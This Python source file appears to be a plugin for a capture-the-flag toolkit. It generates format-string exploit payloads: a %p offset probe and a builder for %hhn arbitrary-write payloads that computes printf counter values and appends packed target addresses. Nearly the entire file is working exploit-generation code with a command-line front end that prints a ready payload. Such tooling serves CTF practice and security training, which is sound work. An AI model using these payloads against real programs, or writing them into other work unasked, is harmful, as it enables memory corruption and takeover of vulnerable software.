"""Format-string exploit helper: offset discovery and %hhn write payloads.

Builds classic "addresses appended at the end" payloads using byte-granular
%hhn writes. The write ordering and counter math follow real printf semantics
so the output can be verified by simulation (see tests/unit/test_pwn.py).
"""

from __future__ import annotations

import argparse
import struct

from rich.panel import Panel

from syctf.core.types import ExecutionContext


def _pack(addr: int, word: int) -> bytes:
    return struct.pack("<I" if word == 4 else "<Q", addr)


def build_probe_payload(count: int = 20) -> bytes:
    """Payload to locate the input offset: find 0x41414141 in the leak."""

    return b"AAAA" + b"".join(b"|%%%d$p" % i for i in range(1, count + 1))


def build_write_payload(offset: int, writes: list[tuple[int, int]], word: int = 8, nbytes: int | None = None) -> bytes:
    """Build a %hhn write payload.

    offset  : arg index where the controlled buffer starts.
    writes  : list of (target_addr, value).
    word    : 8 for x86-64, 4 for x86.
    nbytes  : bytes to write per value (default = word).
    """

    if word not in (4, 8):
        raise ValueError("word must be 4 or 8")
    width = word if nbytes is None else nbytes

    # Expand to per-byte writes and order by byte value (ascending counter).
    byte_writes: list[tuple[int, int]] = []
    for addr, value in writes:
        for i in range(width):
            byte_writes.append((addr + i, (value >> (8 * i)) & 0xFF))
    byte_writes.sort(key=lambda t: t[1])

    # Iteratively resolve the arg index where appended addresses begin.
    base = 0
    fmt_padded = b""
    for _ in range(8):
        first_arg = offset + base
        fmt = _format_section(byte_writes, first_arg)
        pad = (-len(fmt)) % word
        fmt_padded = fmt + b"A" * pad
        new_base = len(fmt_padded) // word
        if new_base == base:
            break
        base = new_base

    addresses = b"".join(_pack(addr, word) for addr, _ in byte_writes)
    return fmt_padded + addresses


def _format_section(byte_writes: list[tuple[int, int]], first_arg: int) -> bytes:
    out = b""
    counter = 0
    for j, (_addr, bval) in enumerate(byte_writes):
        delta = (bval - counter) % 256
        if delta:
            out += b"%" + str(delta).encode() + b"c"
            counter += delta
        out += b"%" + str(first_arg + j).encode() + b"$hhn"
    return out


class FmtStrPlugin:
    """Generate format-string offset probes and %hhn write payloads."""

    name = "fmtstr"
    description = "Format-string helper: offset probe + %hhn arbitrary-write payload builder"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument("--probe", action="store_true", help="Emit an offset-discovery payload")
        parser.add_argument("--count", type=int, default=20, help="Probe: number of %p to emit")
        parser.add_argument("--offset", type=int, help="Write: arg index where input begins")
        parser.add_argument("--addr", help="Write: target address (dec or 0x)")
        parser.add_argument("--value", help="Write: value to write (dec or 0x)")
        parser.add_argument("--arch", choices=["32", "64"], default="64", help="Target architecture")

    def run(self, args: argparse.Namespace, context: ExecutionContext) -> int:
        if args.probe or not (args.offset is not None and args.addr and args.value):
            payload = build_probe_payload(max(1, int(args.count)))
            context.console.print(Panel(repr(payload), title="offset probe payload", border_style="cyan"))
            context.console.print("[dim]Send this; find which %N$p leaks 0x41414141 — that N is your offset.[/dim]")
            if not args.probe:
                context.console.print("[yellow]For a write, pass --offset --addr --value.[/yellow]")
            return 0

        from syctf.utils.mathx import parse_int

        word = 4 if args.arch == "32" else 8
        try:
            addr = parse_int(args.addr)
            value = parse_int(args.value)
        except ValueError as exc:
            context.console.print(f"[bold red]Bad integer:[/bold red] {exc}")
            return 2

        payload = build_write_payload(int(args.offset), [(addr, value)], word=word)
        context.console.print(Panel(repr(payload), title=f"write {hex(value)} -> {hex(addr)} ({args.arch}-bit)", border_style="green"))
        context.console.print(f"[dim]length={len(payload)} bytes; addresses appended at the end.[/dim]")
        context.cache["fmt_payload"] = payload
        return 0


plugin = FmtStrPlugin()
